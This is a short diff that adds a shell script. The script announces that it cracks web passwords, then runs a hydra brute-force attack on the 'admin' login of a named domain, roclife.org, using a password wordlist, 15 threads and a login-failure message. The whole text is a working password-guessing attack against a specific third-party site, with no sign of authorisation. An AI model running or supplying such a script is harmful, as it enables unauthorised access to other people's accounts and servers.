@@ -1,0 +1,3 @@
+echo This script scans and cracks http web-based passwords;
+
+hydra -l admin -P ~/passwords/john.txt -e ns -t 15 -vV -s 80 -f roclife.org http-get / "/gw/webacc/index.php:username=^USER^&pass=^PASS^&submit=Login:[951F] The username or password you entered is incorrect."
